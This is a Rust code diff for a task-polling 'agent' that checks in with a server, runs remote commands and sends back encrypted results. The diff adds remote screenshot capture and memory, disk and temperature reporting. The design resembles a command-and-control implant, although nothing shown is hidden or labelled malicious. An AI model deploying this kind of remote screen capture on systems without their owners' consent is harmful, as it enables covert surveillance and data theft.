@@ -1,8 +1,12 @@
 mod info;
 use reqwest::{get, ClientBuilder};
 use serde::{Deserialize, Serialize};
+
 mod crypt;
+mod screen;
 use std::{net::IpAddr, string, time::Duration};
+
+use crate::screen::takescreen;
 const SERVER: &str = "https://127.0.0.1:6060";
 const GETKEY: &str = "/get_key";
 const ADVERTISE: &str = "/advertise";
@@ -19,6 +23,34 @@ pub struct AddTaskresult {
     pub(crate)  result: String,
 }
 
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct Memory {
+    pub(crate)  total: u64,
+    pub(crate)  free: u64,
+    pub(crate)  used: u64,
+}
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct tempcomponets{
+    pub(crate) label: String,
+    pub(crate) temperature: String,
+
+}
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct Disktoosend {
+    
+    pub(crate) kind: String,
+    pub(crate) file_system:String,
+    pub(crate) name:String,
+    pub(crate) free: u64,
+    pub(crate) total: u64,
+    pub(crate) usage: u64,
+    pub(crate) read_only: bool,
+    pub(crate) removable: bool,
+}
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct Diskstoosend {
+    pub(crate) disks: Vec<Disktoosend>
+}
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct Device {
     pub(crate) id: String,
@@ -72,9 +104,92 @@ async fn progress(url:String,command:String,taskid:String,key:String){
         "get_version" => {
             let _ = add_result(url.to_string(), key, VERSION.to_string(), taskid.to_string()).await;
         }
+        "screenshot" => {
+            let screenbase64 = takescreen();
+            let _ = add_result(url.to_string(), key, screenbase64, taskid.to_string()).await;
+        }
+        "memory" => {
+            use sysinfo::{System};
+            let sys = System::new_all();
+            let total_memory = sys.total_memory() / 1024;
+            let free_memory = sys.free_memory() / 1024;
+            let used_memory = sys.used_memory() / 1024;
+            let memory: Memory = Memory { total: total_memory, free: free_memory, used: used_memory };
+            let memory = match serde_json::to_string(&memory){
+                Ok(str) => str,
+                Err(_) => {
+                    
+                    log("Error: During Parsing Memory Data").await;
+                    let _ = add_result(url.to_string(), key, "Error: During Parsing Memory Data".to_string(), taskid.to_string()).await;
+                    return ;
+                },
+            };
+            let _ = add_result(url.to_string(), key, memory.to_string(), taskid.to_string()).await;
+            
+        }
+        "disk" => {
+            use sysinfo::{Disks};
+            let disks = Disks::new_with_refreshed_list();
+            let mut disk_list: Vec<Disktoosend> = Vec::new();
+            
+            for disk in &disks {
+                let return_disk: Disktoosend = Disktoosend { kind: disk.kind().to_string(), file_system: disk.file_system().to_ascii_uppercase().to_string_lossy().to_string(), 
+                    name: disk.name().to_string_lossy().to_string(), free: disk.available_space() / 1024 / 1024, 
+                    total: disk.total_space() / 1024 / 1024, 
+                    usage: disk.usage().total_written_bytes / 1024 / 1024, 
+                    read_only: disk.is_read_only(), 
+                    removable: disk.is_removable(),}; 
+                disk_list.push(return_disk);
+            }
+            let disklist = match serde_json::to_string(&disk_list){
+                Ok(str) => str,
+                Err(_) => {
+                    
+                    log("Error: During Parsing Memory Data").await;
+                    let _ = add_result(url.to_string(), key, "Error: During Parsing Memory Data".to_string(), taskid.to_string()).await;
+                    return ;
+                },
+            };
+            let _ = add_result(url.to_string(), key, disklist.to_string(), taskid.to_string()).await;
+
+        }
+        "temperature" => {
+            use sysinfo::{Components};
+            let components = Components::new_with_refreshed_list();
+            let mut comp_list: Vec<tempcomponets> = Vec::new();
+            for component in &components {
+                let temp = match component.temperature() {
+                    Some(temp) => temp.to_string(),
+                    None => "Error Retriving".to_string(),
+                };
+                let name = component.label();
+
+                let tempcomp: tempcomponets = tempcomponets { label: name.to_string(), temperature: temp.to_string()};
+                comp_list.push(tempcomp);
+            }
+            let disdt = match serde_json::to_string(&comp_list){
+                Ok(str) => str,
+                Err(_) => {
+                    
+                    log("Error: During Parsing Memory Data").await;
+                    let _ = add_result(url.to_string(), key, "Error: During Parsing Memory Data".to_string(), taskid.to_string()).await;
+                    return ;
+                },
+            };
+     
+            let _ = add_result(url.to_string(), key, disdt.to_string(), taskid.to_string()).await;
+
+        }
+
+        
+        "🎅" => {
+            let _ = add_result(url.to_string(), key, "santa santa claus santa santa".to_string(), taskid.to_string()).await;
+        }
         _ =>  {
             let _ = add_result(url.to_string(), key, "not an command".to_string(), taskid.to_string()).await;
         }
+
+
     }
 
     
@@ -90,7 +205,7 @@ async fn advertise(url: String,key:String) -> bool{
         Ok(str) => str,
         Err(_) => {
             
-            log("Error: During Parsing Advertising Data");
+            log("Error: During Parsing Advertising Data").await;
             return false;},
     };
     let info = crypt::encrypt_string(key.as_bytes(), &info);
@@ -167,7 +282,7 @@ async fn add_result(url:String,key:String,result:String,taskid:String) -> bool{
             return false;},
     };
     let encryptedt = crypt::encrypt_string(key.as_bytes(),&task);
-    let res = client
+    let _res = client
         .post(url.to_string() + ADDRESULT)
         .json(&encryptedt)
         .send().await;
@@ -192,7 +307,7 @@ async fn get_key(url: String) -> String{
                return "".to_string();
             },
         },
-        Err(err) => {
+        Err(_) => {
             return "".to_string();
         },
     };
@@ -202,9 +317,10 @@ async fn get_key(url: String) -> String{
 
 #[tokio::main]
 async fn main() {
+   
 
     println!("agent inilized");
-    let mut server = SERVER.to_string();
+    let server = SERVER.to_string();
     let mut getkey: String = "".to_string();
 
     loop {
